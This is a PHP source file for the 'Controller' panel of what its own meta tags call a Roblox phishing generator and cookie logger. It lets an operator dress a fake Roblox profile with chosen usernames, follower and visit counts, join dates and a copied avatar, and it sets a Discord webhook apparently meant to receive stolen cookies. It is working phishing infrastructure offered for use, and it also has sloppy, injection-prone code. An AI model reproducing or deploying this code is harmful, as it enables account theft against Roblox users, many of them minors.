<?php
session_start();
include("../web/setup/database.php");
include("../web/setup/setup.php");
include("../includes/functions.php");
function getHost($Address) { 
    $parseUrl = parse_url(trim($Address)); 
    return trim($parseUrl['host'] ? $parseUrl['host'] : array_shift(explode('/', $parseUrl['path'], 2))); 
  }
function checkerusername($user){
    $ch = file_get_contents("https://api.roblox.com/users/get-by-username?username=$user");
    $json = json_decode($ch, true);
if($ch == '{"success":false,"errorMessage":"User not found"}'){
    $error = "Username doesn't exist!";
    return $error;
}else{
    $userId = $json["Id"];
    $ch1 = file_get_contents("https://users.roblox.com/v1/users/$userId");
    $json1 = json_decode($ch1, true);
if($json1["isBanned"] == "true"){
    $error = "User is banned";
    return $error;
}if($json1["name"] == "Roblox"){
    $error = "Error 69";
    return $error;
}  else{
return "success";
}
}
}

error_reporting(0);
if($_SESSION["controller"]){
    $controller = $_SESSION["controller"];
    $row = $db->query("SELECT * FROM east WHERE controller='$controller'")->fetch();
    $friends = $row["friends"];
    $followers = $row["followers"];
    $followings = $row["followings"];
    $placevisits = $row["placevisits"];
    $joindate = $row["joindate"];
    $siteid = $row["siteid"];
    $about = file_get_contents("../users/$siteid/about.txt");
    $activity = file_get_contents("../users/$siteid/activity.txt");
    $webhook = $row["webhook"];
    $displayname = $row["displayname"];
    $username = $row["username"];
    $userid = requestId($row["realusername"]);
    if($_SERVER["REQUEST_METHOD"] == "POST"){
    if($_POST["changeusername"]){
    if($_POST["username"]){
    $username = htmlspecialchars($_POST["username"]);
    $check = checkerusername("$username");
        $username = str_replace("<?php", "", $username);
        $username = str_replace("?>", "", $username);
        $username = str_replace("<?=", "", $username);

        $sql = "UPDATE east SET username=? WHERE controller=?";
        $db->prepare($sql)->execute([$username, $controller]);
        $success = "Username has been changed to $username";
    }
    }   
    if($_POST["changeaccountdatas"]){
        if($_POST["accountdatas"]){
        $userid = htmlspecialchars($_POST["accountdatas"]);

        $userid = str_replace("<?php", "", $userid);
        $userid = str_replace("?>", "", $userid);
        $userid = str_replace("<?=", "", $userid);

        if($userid == "1"){
            $error = "Error(69)";
        }else{

        $testinglmaolmao = file_get_contents("https://users.roblox.com/v1/users/$userid");
        $realusernamejson = json_decode($testinglmaolmao, true);
        $realusername1 = $realusernamejson["name"];
        $check = checkerusername($realusername1);
        if($check == "Error 69"){
            $error = "Error";
        }if($check == "Username doesnt exist!"){
            $error = "Username doesnt exist!";
        }if($check == "User is banned"){
            $error = "User is banned";
        }else{
            $userid = str_replace("<?php", "", $userid);
            $userid = str_replace("?>", "", $userid);
            $userid = str_replace("<?=", "", $userid);
    
            
            $sql = "UPDATE east SET realusername=? WHERE controller=?";
            $db->prepare($sql)->execute([$realusername1, $controller]);
            $success = "Account datas has been changed to $realusername1";
        }
        }   
    }
}
    if($_POST["changeplacevisitss"]){
    if($_POST["placevisitss"]){
    if(is_numeric($_POST["placevisitss"])){
        $placevisitss = filter_var($_POST["placevisitss"], FILTER_SANITIZE_NUMBER_INT);;
        $placevisitss = htmlspecialchars($placevisitss);
        $visitscount = str_replace("<?php", "", $placevisitss);
        $visitscount = str_replace("?>", "", $visitscount);
        $visitscount = str_replace("<?=", "", $visitscount);

        $sql = "UPDATE east SET placevisits=? WHERE controller=?";
        $db->prepare($sql)->execute([$visitscount, $controller]);
        $success = "Visits count has been changed to $visitscount";
    }
    }
    }

    }    if($_POST["changefollowingss"]){
        if($_POST["followingss"]){
        if(is_numeric($_POST["followingss"])){
            $followings = filter_var($_POST["followingss"], FILTER_SANITIZE_NUMBER_INT);;
            $followings = htmlspecialchars($followings);
            $followings = str_replace("<?php", "", $followings);
            $followings = str_replace("?>", "", $followings);
            $followings = str_replace("<?=", "", $followings);
    
            $sql = "UPDATE east SET followings=? WHERE controller=?";
            $db->prepare($sql)->execute([$followings, $controller]);
            $success = "Followings count has been changed to $followings";
        }
        }
        }    if($_POST["changefollowerss"]){
            if($_POST["followerss"]){
            if(is_numeric($_POST["followerss"])){
                $followerss = filter_var($_POST["followerss"], FILTER_SANITIZE_NUMBER_INT);;
                $followerss = htmlspecialchars($followerss);
                $followerss = str_replace("<?php", "", $followerss);
                $followerss = str_replace("?>", "", $followerss);
                $followerss = str_replace("<?=", "", $followerss);
        
                $sql = "UPDATE east SET followers=? WHERE controller=?";
                $db->prepare($sql)->execute([$followerss, $controller]);
                $success = "Followers count has been changed to $followings";
            }
            }
            }    if($_POST["changeactivitys"]){
                if($_POST["changeactivitystext"]){
                    $changeactivitystext = $_POST["changeactivitystext"];

                    $handle = fopen("../users/$siteid/activity.txt", "r+"); 

            
$counter = $changeactivitystext;
                    fwrite($handle,$counter1) ; 
                    fclose ($handle) ; 

                    $success = "User Activity has been changed to $changeactivitystext";
                }
                }    if($_POST["changefriendss"]){
                    if($_POST["friendss"]){
                    if(is_numeric($_POST["friendss"])){
                        $friendss = filter_var($_POST["friendss"], FILTER_SANITIZE_NUMBER_INT);;
                        $friendss = htmlspecialchars($friendss);
                        $friendss = str_replace("<?php", "", $friendss);
                        $friendss = str_replace("?>", "", $friendss);
                        $friendss = str_replace("<?=", "", $friendss);
                
                        $sql = "UPDATE east SET friends=? WHERE controller=?";
                        $db->prepare($sql)->execute([$friendss, $controller]);
                        $success = "Friends count has been changed to $friendss";
                    }
                    }
                    } if($_POST["changeabout"]){
                        if($_POST["abouts"]){
                            $abouts = $_POST["abouts"];
                            $shit = file_get_contents("../users/$siteid/about.txt");  

                            $data = file_get_contents("../users/$siteid/about.txt");
                            $newdata = str_replace($shit, $abouts, $data);
                            file_put_contents("../users/$siteid/about.txt", $newdata);   

                            $success = "About has been changed to $abouts";
                    
                        }
                        } if($_POST["changedisplayname"]){
                            if($_POST["displaynames"]){
                                $displaynames = htmlspecialchars($_POST["displaynames"]);
                                $displaynames = str_replace("<?php", "", $displaynames);
                                $displaynames = str_replace("?>", "", $displaynames);
                                $displaynames = str_replace("<?=", "", $displaynames);
                        
                                $sql = "UPDATE east SET displayname=? WHERE controller=?";
                                $db->prepare($sql)->execute([$displaynames, $controller]);
                                $success = "Display name has been changed to $displaynames";
                            }
                            }
                            if($_POST["changecreateds"]){
                                if($_POST["changecreatedss"]){
                                    $joindate = htmlspecialchars($_POST["changecreatedss"]);
                                    $joindate = str_replace("<?php", "", $joindate);
                                    $joindate = str_replace("?>", "", $joindate);
                                    $joindate = str_replace("<?=", "", $joindate);
                                    $joindate = str_replace("-", "/", $joindate);
                            
                                    $sql = "UPDATE east SET joindate=? WHERE controller=?";
                                    $db->prepare($sql)->execute([$joindate, $controller]);
                                    $success = "Account creation date has been changed to $joindate";
                                }
                                } if($_POST["changewebhook"]){
                                    if($_POST["webhooks"]){
                                        if(filter_var($_POST["webhooks"], FILTER_VALIDATE_URL)) {
                                        if (getHost($_POST["webhooks"]) == "discord.com" || getHost($_POST["webhooks"]) == "discordapp.com") {
                                        
                                        $webhooks = htmlspecialchars($_POST["webhooks"]);
                                        $chkwebhook = file_get_contents($webhooks);
                                        $chkwebhook1 = json_decode($chkwebhook);
                                    
                                        if ($chkwebhook1->message == "Unknown Webhook") {
                                        $error = "Please enter an valid webhook!";
                                        } elseif (empty($chkwebhook1->type)) {
                                        
                                        $error = "Please enter an valid webhook!";
                                        } else {
                                        $webhooks = str_replace("<?php", "", $webhooks);
                                        $webhooks = str_replace("?>", "", $webhooks);
                                        $webhooks = str_replace("<?=", "", $webhooks);
                    
                                        $sql = "UPDATE east SET webhook=? WHERE controller=?";
                                        $db->prepare($sql)->execute([$webhooks, $controller]);
                    
                                        $success = "Successfully changed webhook!";
                                        }
                                    }else{
                                        $error = "Webhook must be discord!";
                                    }
                                    }else{
                                        $error = "Input isnt URL";
                                    }
                                }
                                }
}else{
    header("Location: login");
}
?>

<!DOCTYPE html>
<html dir="ltr" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords"
        content="phishing gen, roblox phishing, cookie logger, roblox, <?php echo $siteName; ?>">
    <meta name="description"
        content="<?php echo $siteName; ?> is best roblox phishing generator!">
    <meta name="robots" content="noindex,nofollow">
    <title><?php echo $siteName; ?> - Controller</title>
    <link rel="canonical" href="https://www.wrappixel.com/templates/ample-admin-lite/" />
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo $mainpfp; ?>">
    <!-- Custom CSS -->
    <link href="plugins/bower_components/chartist/dist/chartist.min.css" rel="stylesheet">
    <link rel="stylesheet" href="plugins/bower_components/chartist-plugin-tooltips/dist/chartist-plugin-tooltip.css">
    <!-- Custom CSS -->
    <link href="css/style.min.css" rel="stylesheet">
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body>
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="lds-ripple">
            <div class="lds-pos"></div>
            <div class="lds-pos"></div>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper" data-layout="vertical" data-navbarbg="skin5" data-sidebartype="full"
        data-sidebar-position="absolute" data-header-position="absolute" data-boxed-layout="full">
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <aside class="left-sidebar" data-sidebarbg="skin6">
            <!-- Sidebar scroll-->
            <div class="scroll-sidebar">
                <!-- Sidebar navigation-->
                <nav class="sidebar-nav">
                    <ul id="sidebarnav">
                        <!-- User Profile-->
                        <li class="sidebar-item">
                            <a class="sidebar-link waves-effect waves-dark sidebar-link" href="index.php"
                                aria-expanded="false">
                                <i class="far fa-clock" aria-hidden="true"></i>
                                <span class="hide-menu">Dashboard</span>
                            </a>
                        </li>
                        <li class="sidebar-item pt-2">
                            <a class="sidebar-link waves-effect waves-dark sidebar-link" href="controller"
                                aria-expanded="false">
                                <i class="fa fa-cog" aria-hidden="true"></i>
                                <span class="hide-menu">Controler</span>
                            </a>
                        </li>
                    </ul>

                </nav>
                <!-- End Sidebar navigation -->
            </div>
            <!-- End Sidebar scroll-->
        </aside>
        <!-- ============================================================== -->
        <!-- End Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page wrapper  -->
        <!-- ============================================================== -->
        <div class="page-wrapper">
            <!-- ============================================================== -->
            <!-- Bread crumb and right sidebar toggle -->
            <!-- ============================================================== -->
            <div class="page-breadcrumb bg-white">
                <div class="row align-items-center">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Controller</h4>
                    </div>
                    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                        <div class="d-md-flex">
                            <ol class="breadcrumb ms-auto">
                                <li><a href="#" class="fw-normal">Controller</a></li>
                            </ol>
                            <a href="logout.php"
                                class="btn btn-danger  d-none d-md-block pull-right ms-3 hidden-xs hidden-sm waves-effect waves-light text-white"><i class="fa fa-power-off"> </i></a>
                        </div>
                    </div>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- ============================================================== -->
            <!-- End Bread crumb and right sidebar toggle -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- Container fluid  -->
            <!-- ============================================================== -->
            <div class="container-fluid">
                <div class="row justify-content-center">
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Username</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $username; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="newusername" placeholder=" New Username" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeUsername()"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Display Name</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $displayname; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="displayname" placeholder=" New Display Name" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeDisplayName();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> About</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $about; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<textarea type="text" id="about" placeholder=" New About" class="form-control p-0 border-0" style="margin-top: 0px; margin-bottom: 0px; height: 35px;"></textarea> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeAbout();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Friends</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $friends; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="friends" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder=" New Friends" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeFriends();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Followers</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $followers; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="followers" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder=" New Followers" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeFollowers();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Followings</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $followings; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="followings" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder=" New Followings" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeFollowings();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Place Visits</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $placevisits; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="placevisits" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder=" New Place Visits" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeplacevisits();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Account Data [Change Avatar]</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $userid; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" id="accountdata" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder=" New Account Data [UserId]" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeaccountdata();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-4 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Account Created</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $joindate; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="date" id="created" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changecreated();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                    <div class="col-lg-6 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Activity</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $activity; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<select name="selectactivity" id="selectactivity" class="form-control p-0 border-0">
                                      <option value="none">None</option>
                                      <option value="online">Online</option>
                                      <option value="game">Game</option>
                                      <option value="studio">Studio</option>
                                    </select> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeactivity();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>

                    <div class="col-lg-12 col-md-12">
                    	<div class="white-box analytics-info">
                    		<h3 class="box-title"> Webhook</h3>
                    		<div class="form-group mb-4">
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="text" class="form-control p-0 border-0" value=" <?php echo $webhook; ?>" disabled> </div>
                    				<br>
                    			<div class="col-md-12 border-bottom p-0">
                    				<input type="url" id="webhook" placeholder=" New Webhook" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button class="btn btn-primary" style="border-radius:10px;text-align: right;" onclick="changeWebhook();"><i class="fas fa-pencil-alt"> Edit</i></button>
                    	</div>
                    </div>
                </div>
                
            <footer class="footer text-center"> <?php echo $siteName; ?> since 2021
            </footer>
            <!-- ============================================================== -->
            <!-- End footer -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="plugins/bower_components/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="bootstrap/dist/js/bootstrap.bundle.min.js"></script>
    <script src="js/app-style-switcher.js"></script>
    <script src="plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js"></script>
    <!--Wave Effects -->
    <script src="js/waves.js"></script>
    <!--Menu sidebar -->
    <script src="js/sidebarmenu.js"></script>
    <!--Custom JavaScript -->
    <script src="js/custom.js"></script>
    <!--This page JavaScript -->
    <!--chartis chart-->
    <script src="plugins/bower_components/chartist/dist/chartist.min.js"></script>
    <script src="plugins/bower_components/chartist-plugin-tooltips/dist/chartist-plugin-tooltip.min.js"></script>
    <script src="js/pages/dashboards/dashboard1.js"></script>
    <?php
    if(isset($error)){
        echo "<script>Swal.fire('Error','$error','error' )</script> ";
    }if(isset($success)){
    echo "<script>Swal.fire( 'Success', '$success', 'success' )</script> ";
}
    ?>
    <form method="POST" hidden>
                <input type="text" id="username" name="username">
        <input type="submit" id="changeusername" name="changeusername">
    </form>
    <form method="POST" hidden>
                <input type="text" id="displaynames" name="displaynames">
        <input type="submit" id="changedisplayname" name="changedisplayname">
    </form>
    <form method="POST" hidden>
                <input type="text" id="abouts" name="abouts">
        <input type="submit" id="changeabout" name="changeabout">
    </form>
    <form method="POST" hidden>
                <input type="text" id="friendss" name="friendss">
        <input type="submit" id="changefriendss" name="changefriendss">
    </form>
    <form method="POST" hidden>
                <input type="text" id="followerss" name="followerss">
        <input type="submit" id="changefollowerss" name="changefollowerss">
    </form>
    <form method="POST" hidden>
                <input type="text" id="followingss" name="followingss">
        <input type="submit" id="changefollowingss" name="changefollowingss">
    </form>
    <form method="POST" hidden>
                <input type="text" id="placevisitss" name="placevisitss">
        <input type="submit" id="changeplacevisitss" name="changeplacevisitss">
    </form>
    <form method="POST" hidden>
                <input type="text" id="accountdatas" name="accountdatas">
        <input type="submit" id="changeaccountdatas" name="changeaccountdatas">
    </form>
    <form method="POST" hidden>
                <input type="text" id="changecreatedss" name="changecreatedss">
        <input type="submit" id="changecreateds" name="changecreateds">
    </form>
    <form method="POST" hidden>
                <input type="text" id="changeactivitystext" name="changeactivitystext">
        <input type="submit" id="changeactivitys" name="changeactivitys">
    </form>
    <form method="POST" hidden>
                <input type="text" id="socialmediatype" name="socialmediatype">
        <input type="text" id="changesocialmediastext" name="changesocialmediastext">
        <input type="submit" id="changesocialmedias" name="changesocialmedias">
    </form>
    <form method="POST" hidden>
                <input type="text" id="webhooks" name="webhooks">
        <input type="submit" id="changewebhook" name="changewebhook">
    </form>
    <script>
        function changeUsername(){
            var newusername = document.getElementById("newusername").value;
            if(!newusername){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else if(newusername.length < 3){
                Swal.fire(
                  'Error',
                  'Invalid Username!',
                  'error'
                )
            }else{
                document.getElementById("username").value = newusername;
                document.getElementById("changeusername").click();
            }
        }
        function changeDisplayName(){
            var displayname = document.getElementById("displayname").value;
            if(!displayname){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else if(displayname.length < 3){
                Swal.fire(
                  'Error',
                  'Invalid Username!',
                  'error'
                )
            }else{
                document.getElementById("displaynames").value = displayname;
                document.getElementById("changedisplayname").click();
            }
        }
        function changeAbout(){
            var about = document.getElementById("about").value;
            if(!about){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("abouts").value = about.replace(/\r?\n/g, '<br>');;
                document.getElementById("changeabout").click();
            }
        }
        function changeFriends(){
            var friends = document.getElementById("friends").value;
            if(!friends){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("friendss").value = friends;
                document.getElementById("changefriendss").click();
            }
        }
        function changeFollowers(){
            var followers = document.getElementById("followers").value;
            if(!followers){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("followerss").value = followers;
                document.getElementById("changefollowerss").click();
            }
        }
        function changeFollowings(){
            var followings = document.getElementById("followings").value;
            if(!followings){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("followingss").value = followings;
                document.getElementById("changefollowingss").click();
            }
        }
        function changeplacevisits(){
            var placevisits = document.getElementById("placevisits").value;
            if(!placevisits){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("placevisitss").value = placevisits;
                document.getElementById("changeplacevisitss").click();
            }
        }
        function changeaccountdata(){
            var accountdata = document.getElementById("accountdata").value;
            if(!accountdata){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("accountdatas").value = accountdata;
                document.getElementById("changeaccountdatas").click();
            }
        }
        function changecreated(){
            var created = document.getElementById("created").value;
            if(!created){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("changecreatedss").value = created;
                document.getElementById("changecreateds").click();
            }
        }
        function changeactivity(){
            document.getElementById("changeactivitystext").value = document.getElementById("selectactivity").value;
            document.getElementById("changeactivitys").click();
        }
        function changesocialmedia(){
            document.getElementById("socialmediatype").value = document.getElementById("selectsocialmedia").value;
            document.getElementById("changesocialmediastext").value = document.getElementById("link").value;
            document.getElementById("changesocialmedias").click();
        }
        function changeWebhook(){
            var webhook = document.getElementById("webhook").value;
            if(!webhook){
                Swal.fire(
                  'Error',
                  'Input can&#039;t be empty!',
                  'error'
                )
            }else{
                document.getElementById("webhooks").value = webhook;
                document.getElementById("changewebhook").click();
            }
        }
    </script>
</body>

</html>